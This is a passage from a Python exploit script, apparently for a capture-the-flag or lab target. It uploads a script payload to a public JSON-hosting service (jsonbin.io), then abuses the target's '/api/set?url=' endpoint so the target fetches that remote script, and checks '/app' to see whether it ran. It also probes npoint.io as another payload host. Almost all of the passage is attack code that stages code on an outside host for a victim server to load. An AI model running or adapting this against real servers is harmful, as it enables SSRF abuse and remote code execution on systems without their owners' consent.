# These let you store JSON and retrieve it

# Approach 1: Try api.jsonbin.io (public bins)
# jsonbin.io/v3/qs/<id> - quick store feature
print("[+] Testing jsonbin.io...")
try:
    # First, try to create a bin
    create_url = "https://api.jsonbin.io/v3/b"
    headers = {"Content-Type": "application/json"}
    payload = {"script": "print(123)"}
    r = requests.post(create_url, headers=headers, json=payload, timeout=10)
    print(f"[+] Create bin response: {r.status_code}")
    print(f"[+] Create bin: {r.text}")
    
    # Extract bin ID if successful
    if r.status_code in [200, 201]:
        bin_data = r.json()
        bin_id = bin_data.get('metadata', {}).get('id')
        if bin_id:
            public_url = f"https://api.jsonbin.io/v3/b/{bin_id}/latest"
            print(f"[+] Bin URL: {public_url}")
            
            # Test the URL
            r2 = requests.get(public_url)
            print(f"[+] Bin GET response: {r2.text[:500]}")
            
            # Check if it has the structure we need
            resp = r2.json()
            if 'record' in resp and 'script' in resp['record']:
                print(f"[+] Found script in record: {resp['record']['script']}")
                
                # Try SSRF
                set_url = f"{target}/api/set?url={urllib.parse.quote(public_url)}"
                r3 = requests.get(set_url)
                print(f"[+] Set URL: {r3.text}")
                
                r4 = requests.get(f"{target}/app")
                print(f"[+] App response: {r4.status_code}")
                print(r4.text[:1500])
except Exception as e:
    print(f"[+] jsonbin error: {e}")

# Approach 2: Try npoint.io
print("\n[+] Testing npoint.io...")
try:
    # npoint.io lets you create JSON endpoints
    # Try default/demo endpoints
    npoint_url = "https://api.npoint.io/5c3c67a39917b65a9a0c"
    r = requests.get(npoint_url, timeout=5)
    print(f"[+] npoint status: {r.status_code}")
    print(f"[+] npoint keys: {list(r.json().keys()) if r.status_code == 200 else 'N/A'}")
except Exception as e:
    print(f"[+] npoint error: {e}")

# Approach 3: Try MyJSON
